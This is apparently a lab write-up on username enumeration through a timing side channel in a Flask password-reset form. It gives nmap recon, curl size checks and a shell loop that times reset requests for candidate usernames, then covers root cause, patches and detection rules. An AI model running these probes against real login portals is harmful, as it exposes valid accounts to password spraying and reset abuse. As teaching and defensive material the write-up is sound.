Pre-req knowledge

  • HTTP form POST (application/x-www-form-urlencoded)
  • Basic web recon (nmap, curl, form mapping)
  • Idea that “identical error messages” do not stop side channels
  • How password-reset flows usually look up a user and send email

Core concept

When the application returns the same HTML for every username, measure how long the server takes. A valid account still pays the cost of “real work” (token + email path); invalid accounts return early. Latency is the oracle.

1. Scope

Black-box assessment of a client external login portal. OSINT produced a candidate username list (usernames-hunter.txt). Goal: find which name is valid.

2. Recon

nmap -sV -sC -p- --min-rate 1000 -T4 10.1.4.200
Why: map services before poking the app. Only 22/ssh and 80/http are open. HTTP is Werkzeug (Flask) serving HackSmarter Portal - Login.

Interesting paths:

  • / · /login — username + password
  • /reset — username only (“send reset link”)

3. Content-based enum fails

Wrong password / random users on login and reset always return the same body size and message:

If an account matches that username, a reset link has been sent to the email on file.
Why this is intentional: developers often “fix” username enum by using one generic sentence. That only removes string and length oracles. Side channels (time, email bounce, lockout) can remain. 
# same size every time
curl -s -o /dev/null -w '%{size_download}\n' -X POST http://10.1.4.200/reset -d 'username=admin'
curl -s -o /dev/null -w '%{size_download}\n' -X POST http://10.1.4.200/reset -d 'username=joey'
# both → 1984

4. Timing oracle on /reset

for u in joey admin root nonexistentxyz salvador tyler user guest; do
  for i in 1 2 3; do
    t=$(curl -s -o /dev/null -w '%{time_total}' \
      -X POST http://10.1.4.200/reset -d "username=${u}")
    echo "$u $i $t"
  done
done
First principles: invalid user → “not in DB” → return generic HTML fast. Valid user → load account → create reset token → attempt mail delivery → then return the same HTML. Wall-clock time diverges even when bytes do not.

Beyond Root

Exploit path depth

  • Bug class: authentication side channel (timing), not injection.
  • Root cause: response is constant in content, not constant in time.
  • Impact: valid usernames feed password sprays, social engineering, and reset abuse.

Blue team — patch / detect

  • Patch: return HTTP immediately for all usernames; enqueue email asynchronously so valid/invalid share the same fast path (or add artificial delay to match).
  • Patch: rate-limit /reset per IP and per username; CAPTCHA after N tries.
  • Detect: high volume of reset POSTs; latency spikes correlated with a single username from one client.
  • Detect: SIEM rule on password-reset endpoint request rate + distinct usernames per minute.
